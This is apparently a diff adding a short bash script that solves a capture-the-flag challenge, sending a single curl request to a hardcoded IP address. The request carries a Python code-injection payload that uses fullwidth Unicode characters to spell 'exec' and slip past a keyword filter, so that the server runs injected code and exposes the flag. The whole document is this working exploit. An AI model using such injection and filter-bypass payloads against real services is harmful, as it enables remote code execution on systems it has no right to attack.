@@ -1,0 +1,3 @@
+#!/bin/bash
+
+curl 'http://172.105.120.180:9999/?debug=import+__main__;__main__.fail=__main__.FL4G' -F 'type=FL4G' -F 'number=ｅｘｅｃ(ｄｅｂｕｇ)'
